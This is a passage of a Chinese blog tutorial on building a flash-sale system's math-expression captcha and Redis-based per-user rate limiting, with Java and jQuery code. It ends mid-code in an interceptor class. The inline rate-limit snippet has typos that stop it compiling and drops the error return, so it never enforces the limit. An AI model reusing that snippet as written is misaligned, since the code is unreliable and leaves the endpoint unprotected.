数学公式验证码</h2><p><strong>验证码的作用：</strong></p><ul><li>防止利用机器人等手段防止非目标用户参与秒杀；</li><li>减少单位时间内的请求数量。对于一个秒杀商品，在开始秒杀后肯定会有许多用户参与秒杀，那么在开始秒杀的时候，用户请求数量是巨大，从而对服务器产生较大的压力，而通过验证码的方式就可以有效地将集中式的请求分散，从而达到<strong>削减请求峰值</strong>的目的。</li></ul><p><strong>实现思路：</strong></p><p>在服务端计算出验证码的表达式的值，存储在服务端，客户端输入验证码的表达式值，传入服务端进行验证。</p><ul><li>点击秒杀之前，向让用户输入验证码，分散用户的请求；</li><li>添加生成验证码的接口；</li><li>在获取秒杀路径的时候，验证验证码；</li><li>ScriptEngine的使用（用于计算验证码上的表达式）。</li></ul><p>当秒杀未开始时，商品详情页异步地向服务端发出获取商品详细信息的请求，同时，获取验证码。服务端收到获取验证码的请求后，生成验证码返回给客户端，同时，将验证码的结果存储再redis中，以便客户端发起秒杀请求时做验证码的校验。</p><p>比如：1秒钟进来10万个请求，与10秒钟进来10万个请求，差别很大。</p><ol><li>goods_detail.htm 商品详情</li></ol><p>添加图形验证码和输入框元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;row&quot;</span>&gt;<br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-inline&quot;</span>&gt;<br>        &lt;img id=<span class="hljs-string">&quot;verifyCodeImg&quot;</span> width=<span class="hljs-string">&quot;80&quot;</span> height=<span class="hljs-string">&quot;32&quot;</span> style=<span class="hljs-string">&quot;display: none&quot;</span> onclick=<span class="hljs-string">&quot;refreshVerifyCode()&quot;</span>/&gt;<br>        &lt;input id=<span class="hljs-string">&quot;verifyCode&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;form-control&quot;</span> style=<span class="hljs-string">&quot;display: none&quot;</span>/&gt;<br>        &lt;button <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;btn btn-primary btn-block&quot;</span> type=<span class="hljs-string">&quot;button&quot;</span> id=<span class="hljs-string">&quot;buyButton&quot;</span><br>        onclick=<span class="hljs-string">&quot;getMiaoshaPath()&quot;</span>&gt;立即秒杀<br>        &lt;/button&gt;<br>    &lt;/div&gt;<br>&lt;/div&gt;<br><br><span class="hljs-comment">//点击图片会刷新验证码，为防止浏览器缓存，需要在url添加一个时间戳</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">refreshVerifyCode</span>(<span class="hljs-params"></span>) </span>&#123;<br>    $(<span class="hljs-string">&quot;#verifyCodeImg&quot;</span>).attr(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;/miaosha/verifyCode?goodsId=&quot;</span>+$(<span class="hljs-string">&quot;#goodsId&quot;</span>).val()+<span class="hljs-string">&quot;&amp;timestamp=&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().getTime());<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>获取验证码js</p><p>获取商品详情的ajax ，渲染页面时，有个倒计时判断，在秒杀进行中增加显示验证码，在秒杀结束时隐藏验证码。</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countDown</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> remainSeconds = $(<span class="hljs-string">&quot;#remainSeconds&quot;</span>).val();<br>        <span class="hljs-keyword">var</span> timeout;<br>        <span class="hljs-keyword">if</span> (remainSeconds &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//秒杀还没开始，倒计时</span><br>            $(<span class="hljs-string">&quot;#buyButton&quot;</span>).attr(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">true</span>);<br>            $(<span class="hljs-string">&quot;#miaoshaTip&quot;</span>).html(<span class="hljs-string">&quot;秒杀倒计时：&quot;</span> + remainSeconds + <span class="hljs-string">&quot;秒&quot;</span>);<br>            timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>                $(<span class="hljs-string">&quot;#countDown&quot;</span>).text(remainSeconds - <span class="hljs-number">1</span>);<br>                $(<span class="hljs-string">&quot;#remainSeconds&quot;</span>).val(remainSeconds - <span class="hljs-number">1</span>);<br>                countDown();<br>            &#125;, <span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (remainSeconds == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//秒杀进行中</span><br>            $(<span class="hljs-string">&quot;#buyButton&quot;</span>).attr(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">if</span> (timeout) &#123;<br>                <span class="hljs-built_in">clearTimeout</span>(timeout);<br>            &#125;<br>            $(<span class="hljs-string">&quot;#miaoshaTip&quot;</span>).html(<span class="hljs-string">&quot;秒杀进行中&quot;</span>);<br>            <span class="hljs-comment">//显示图片</span><br>            $(<span class="hljs-string">&quot;#verifyCodeImg&quot;</span>).attr(<span class="hljs-string">&quot;src&quot;</span>, <span class="hljs-string">&quot;/miaosha/verifyCode?goodsId=&quot;</span>+$(<span class="hljs-string">&quot;#goodsId&quot;</span>).val());<br>            $(<span class="hljs-string">&quot;#verifyCodeImg&quot;</span>).show();<br>            <span class="hljs-comment">//显示验证码图片和输入框</span><br>            $(<span class="hljs-string">&quot;#verifyCode&quot;</span>).show();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//秒杀已经结束</span><br>            $(<span class="hljs-string">&quot;#buyButton&quot;</span>).attr(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">true</span>);<br>            $(<span class="hljs-string">&quot;#miaoshaTip&quot;</span>).html(<span class="hljs-string">&quot;秒杀已经结束&quot;</span>);<br>             <span class="hljs-comment">//隐藏验证码图片和输入框</span><br>            $(<span class="hljs-string">&quot;#verifyCodeImg&quot;</span>).hide();<br>            $(<span class="hljs-string">&quot;#verifyCode&quot;</span>).hide();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>新增获取图形验证码接口</li></ol><p>使用 jdk 自带的一个 BufferedImage，使用OutputStream 输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取图形验证码</span><br><span class="hljs-comment">     * */</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/verifyCode&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">getMiaoshaVerifyCode</span><span class="hljs-params">(HttpServletResponse response, MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId)</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            BufferedImage image = miaoshaService.createVerifyCode(user,goodsId);<br>            <span class="hljs-comment">//通过response返回</span><br>            OutputStream out = response.getOutputStream();<br>            ImageIO.write(image,<span class="hljs-string">&quot;JPEG&quot;</span>,out);<br>            out.flush();<br>            out.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.MIAOSHA_FAIL);<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>创建图形验证码逻辑</li></ol><p>先构建一个图（长、宽、格式），再分别设置颜色、背景等；</p><p>再生成一个加减乘除的表达式，并设置到图形中，最后计算表达式的值并设置到redis缓存中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//生成验证码</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> BufferedImage <span class="hljs-title">createVerifyCode</span><span class="hljs-params">(MiaoshaUser user, <span class="hljs-keyword">long</span> goodsId)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span> || goodsId &lt;=<span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> width = <span class="hljs-number">80</span>;<br>        <span class="hljs-keyword">int</span> height = <span class="hljs-number">32</span>;<br>        <span class="hljs-comment">//create the image</span><br>        BufferedImage image = <span class="hljs-keyword">new</span> BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);<br>        Graphics g = image.getGraphics();<br>        <span class="hljs-comment">// set the background color</span><br>        g.setColor(<span class="hljs-keyword">new</span> Color(<span class="hljs-number">0xDCDCDC</span>));<br>        g.fillRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height);<br>        <span class="hljs-comment">// draw the border</span><br>        g.setColor(Color.black);<br>        g.drawRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width - <span class="hljs-number">1</span>, height - <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// create a random instance to generate the codes</span><br>        Random rdm = <span class="hljs-keyword">new</span> Random();<br>        <span class="hljs-comment">// make some confusion</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++) &#123;<br>            <span class="hljs-keyword">int</span> x = rdm.nextInt(width);<br>            <span class="hljs-keyword">int</span> y = rdm.nextInt(height);<br>            g.drawOval(x, y, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-comment">// generate a random code</span><br>        String verifyCode = generateVerifyCode(rdm);<br>        g.setColor(<span class="hljs-keyword">new</span> Color(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>));<br>        g.setFont(<span class="hljs-keyword">new</span> Font(<span class="hljs-string">&quot;Candara&quot;</span>, Font.BOLD, <span class="hljs-number">24</span>));<br>        g.drawString(verifyCode, <span class="hljs-number">8</span>, <span class="hljs-number">24</span>);<br>        g.dispose();<br>        <span class="hljs-comment">//把验证码存到redis中</span><br>        <span class="hljs-keyword">int</span> rnd = calc(verifyCode);<br>        redisService.set(MiaoshaKey.getMiaoshaVerifyCode, user.getId()+<span class="hljs-string">&quot;,&quot;</span>+goodsId, rnd);<br>        <span class="hljs-comment">//输出图片</span><br>        <span class="hljs-keyword">return</span> image;<br>    &#125;<br><br><span class="hljs-comment">//js计算验证码</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">calc</span><span class="hljs-params">(String exp)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ScriptEngineManager manager = <span class="hljs-keyword">new</span> ScriptEngineManager();<br>            ScriptEngine engine = manager.getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>);<br>            <span class="hljs-keyword">return</span> (Integer)engine.eval(exp);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>[] ops = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[] &#123;<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>&#125;;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 加减乘的公式</span><br><span class="hljs-comment">     * */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">generateVerifyCode</span><span class="hljs-params">(Random rdm)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> num1 = rdm.nextInt(<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">int</span> num2 = rdm.nextInt(<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">int</span> num3 = rdm.nextInt(<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">char</span> op1 = ops[rdm.nextInt(<span class="hljs-number">3</span>)];<br>        <span class="hljs-keyword">char</span> op2 = ops[rdm.nextInt(<span class="hljs-number">3</span>)];<br>        String exp = <span class="hljs-string">&quot;&quot;</span>+ num1 + op1 + num2 + op2 + num3;<br>        <span class="hljs-keyword">return</span> exp;<br>    &#125;<br></code></pre></td></tr></table></figure><ol><li><p>校验</p><p>a. 获取秒杀地址ajax,增加用户输入的计算好的验证码参数，因为用户点击“立即秒杀”，需要先去获取秒杀地址，才会往下执行真正的秒杀操作。顺序：验证码 —&gt; 秒杀地址  —&gt; 秒杀  （在获取秒杀地址接口中，校验验证码）</p><p>b.     获取秒杀地址，校验验证码的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 获取秒杀接口地址</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/path&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">getMiaoshaPath</span><span class="hljs-params">(HttpServletRequest request,MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(value = &quot;verifyCode&quot;,defaultValue = &quot;0&quot;)</span><span class="hljs-keyword">int</span> verifyCode</span></span><br><span class="hljs-function"><span class="hljs-params">            )</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>        &#125;<br>        <span class="hljs-comment">//检验校验码</span><br>        <span class="hljs-keyword">boolean</span> check = miaoshaService.checkVerifyCode(user,goodsId,verifyCode);<br>        <span class="hljs-keyword">if</span> (!check)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.REQUEST_ILLEGAL);<br>        &#125;<br>        String path = miaoshaService.createMiaoshaPath(user,goodsId);<br>        <span class="hljs-keyword">return</span> Result.success(path);<br>    &#125;<br><br><br> <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 校验方法</span><br><span class="hljs-comment">    * */</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">checkVerifyCode</span><span class="hljs-params">(MiaoshaUser user, <span class="hljs-keyword">long</span> goodsId, <span class="hljs-keyword">int</span> verifyCode)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span> || goodsId &lt;=<span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        Integer codeOld = redisService.get(MiaoshaKey.getMiaoshaVerifyCode, user.getId()+<span class="hljs-string">&quot;,&quot;</span>+goodsId, Integer.class);<br>        <span class="hljs-keyword">if</span>(codeOld == <span class="hljs-keyword">null</span> || codeOld - verifyCode != <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        redisService.delete(MiaoshaKey.getMiaoshaVerifyCode, user.getId()+<span class="hljs-string">&quot;,&quot;</span>+goodsId);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="7-3-接口限流防刷"><a href="#7-3-接口限流防刷" class="headerlink" title="7.3 接口限流防刷"></a>7.3 接口限流防刷</h2><p><strong>接口限流作用</strong></p><ul><li>对用户的访问进行一定的限制，就可以减轻服务器压力。例如通过访问次数的限制就是一种限流防刷的手段。即限制用户下一定的时间间隔内对接口的访问次数。</li></ul><p><strong>实现思路</strong></p><ul><li><p>如果使用计时器来做这个功能，实现起来比较复杂。可以充分利用<strong>redis</strong>中的key-value过期机制来完成。</p></li><li><p>在redis中存储一个用于记录访问次数的变量，在过期时间内被继续访问，则次数变量加1，如果在过期时间内访问次数超出限制，则返回“频繁提交提示用户”。过期时间到了之后，将该变量删除。</p></li><li><p>因为可能需要对很多接口对限流防刷操作，如果对每一个接口都实现一遍限流防刷，则会导致代码过度冗余，因此，可以定义一个方法拦截器<code>@AccessInterceptor</code>拦截用户对接口的请求，统一对拦截限流逻辑处理，这样可以有效地减少代码的冗余。针对需要拦截请求的接口，添加注解<code>@AccessLimit</code>即可。</p></li></ul><p>在获取秒杀地址接口中增加限制，位于校验验证码之前每次访问加1，超过5次返回“操作台频繁”</p><p>设置到redis,key : 当前获取秒杀地址请求的url + 用户id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 获取秒杀接口地址</span><br><span class="hljs-comment">    * */</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/path&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">getMiaoshaPath</span><span class="hljs-params">(HttpServletRequest request,MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(value = &quot;verifyCode&quot;,defaultValue = &quot;0&quot;)</span><span class="hljs-keyword">int</span> verifyCode</span></span><br><span class="hljs-function"><span class="hljs-params">            )</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.SESSION_ERROR);<br>        &#125;<br>        <span class="hljs-comment">//查询访问次数</span><br>        String uri = request.getRequestURI();<br>        String key = uri + <span class="hljs-string">&quot;_&quot;</span> +user.getId();<br>        Interget count = redisService.get(AccressKey.access,key,Integer.class);<br>        <span class="hljs-keyword">if</span>(count == <span class="hljs-keyword">null</span>)&#123;<br>        redisService.set(AccressKey.access,key,<span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(count &lt; <span class="hljs-number">5</span>)&#123;<br>        redisService.incrAccressKey.access,key);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        Result.error(CodeMsg.ACCESS_LIMIT_REACHED);<br>        &#125;<br>        <br>        <br>        <span class="hljs-keyword">boolean</span> check = miaoshaService.checkVerifyCode(user,goodsId,verifyCode);<br>        <span class="hljs-keyword">if</span> (!check)&#123;<br>            <span class="hljs-keyword">return</span> Result.error(CodeMsg.REQUEST_ILLEGAL);<br>        &#125;<br>        String path = miaoshaService.createMiaoshaPath(user,goodsId);<br>        <span class="hljs-keyword">return</span> Result.success(path);<br>    &#125;<br></code></pre></td></tr></table></figure><p>​        如果秒杀接口、获取秒杀结果接口等也要限制，每个方法都要写这样的逻辑，所以需要写一个通用的方法，比如注解+拦截器。</p><ol><li>直接在controller方法上加注解即可：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">    * 获取秒杀接口地址</span><br><span class="hljs-comment">    * */</span><br><span class="hljs-comment">//</span><br>    <span class="hljs-meta">@AccessLimit(seconds = 5,maxCount = 5,needLogin = true)</span><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/path&quot;,method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title">getMiaoshaPath</span><span class="hljs-params">(HttpServletRequest request,MiaoshaUser user,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(&quot;goodsId&quot;)</span><span class="hljs-keyword">long</span> goodsId,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-meta">@RequestParam(value = &quot;verifyCode&quot;,defaultValue = &quot;0&quot;)</span><span class="hljs-keyword">int</span> verifyCode</span></span><br><span class="hljs-function"><span class="hljs-params">            )</span></span>&#123;<br>        <span class="hljs-comment">//...</span><br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>新建AccessLimit 限流注解</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AccessLimit &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seconds</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxCount</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">needLogin</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">true</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>新增拦截器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AccessInterceptor</span>  <span class="hljs-keyword">extends</span> <span class="hljs-title">HandlerInterceptorAdapter</span></span>&#123;<br><br><span class="hljs-meta">@Autowired</span><br>MiaoshaUserService userService;<br><br><span class="hljs-meta">@Autowired</span><br>RedisService redisService;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span><br><span class="hljs-function"><span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-keyword">if</span>(handler <span class="hljs-keyword">instanceof</span> HandlerMethod) &#123;<br>MiaoshaUser user = getUser(request, response);<br>UserContext.setUser(user);<br>HandlerMethod hm = 